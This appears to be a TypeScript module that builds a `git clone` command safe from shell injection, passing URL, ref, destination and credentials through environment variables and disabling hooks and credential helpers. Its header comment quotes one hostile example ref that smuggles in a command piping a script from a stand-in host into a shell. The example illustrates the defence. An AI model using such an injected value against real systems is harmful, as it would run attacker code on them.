/**
 * Injection-safe `git clone` command construction.
 *
 * Every caller-supplied value (URL, ref, destination, credentials) is passed
 * through the environment and referenced as a quoted `"$VAR"`, never
 * interpolated into the command string. A hostile ref — e.g.
 * `main" ; curl evil.sh | sh ; "` — therefore cannot break quoting or inject
 * shell, and the token never lands in argv, the clone URL, or `.git/config`.
 *
 * This mirrors the construction DaytonaExecutor.cloneRepo() already uses. The
 * two are deliberately kept separate rather than shared: Daytona is the only
 * executor used in staging and production, its current shape exists to fix a
 * specific x509 trust-store failure (4047b674), and it is not worth churning
 * that code to de-duplicate with a development-only path. Keep them in step by
 * hand if either changes.
 */

/** Path of the askpass helper written into the sandbox. */
export const ASKPASS_PATH = "/tmp/git-askpass.sh";

/**
 * Helper script git invokes for credential prompts. It echoes the values we
 * hand it via env, so credentials stay out of argv and the URL.
 */
export const ASKPASS_SCRIPT = [
  "#!/bin/sh",
  'case "$1" in',
  '  Username*) printf "%s" "$GIT_USERNAME" ;;',
  '  Password*) printf "%s" "$GIT_PASSWORD" ;;',
  "esac",
  "",
].join("\n");

export interface CloneCommand {
  /** Shell command to run. Contains no caller-supplied data. */
  command: string;
  /** Environment carrying every caller-supplied value. */
  env: Record<string, string>;
}

/**
 * `credential.helper=` and `core.hooksPath=/dev/null` neutralize any inherited
 * credential helper or repository hook — defense in depth, so a malicious repo
 * cannot execute code during clone.
 */
const GIT_BASE = "git -c credential.helper= -c core.hooksPath=/dev/null";

/** A commit SHA is not a fetchable ref name, so it needs clone-then-checkout. */
function isCommitSha(ref: string): boolean {
  return /^[0-9a-f]{7,40}$/i.test(ref);
}

export function buildCloneCommand(opts: {
  url: string;
  dest: string;
  ref?: string;
  username?: string;
  password?: string;
}): CloneCommand {
  const { url, dest, ref } = opts;

  let inner: string;
  if (!ref) {
    inner = `${GIT_BASE} clone --depth 1 -- "$GIT_URL" "$GIT_DEST"`;
  } else if (isCommitSha(ref)) {
    inner = `${GIT_BASE} clone -- "$GIT_URL" "$GIT_DEST" && ${GIT_BASE} -C "$GIT_DEST" checkout "$GIT_REF"`;
  } else {
    inner = `${GIT_BASE} clone --depth 1 --branch "$GIT_REF" -- "$GIT_URL" "$GIT_DEST"`;
  }

  return {
    // Merge stderr→stdout: some executors surface only stdout, and git writes
    // progress and errors to stderr.
    command: `( ${inner} ) 2>&1`,
    env: {
      GIT_ASKPASS: ASKPASS_PATH,
      GIT_TERMINAL_PROMPT: "0",
      GIT_USERNAME: opts.username || "x-access-token",
      GIT_PASSWORD: opts.password ?? "",
      GIT_URL: url,
      GIT_DEST: dest,
      ...(ref ? { GIT_REF: ref } : {}),
    },
  };
}
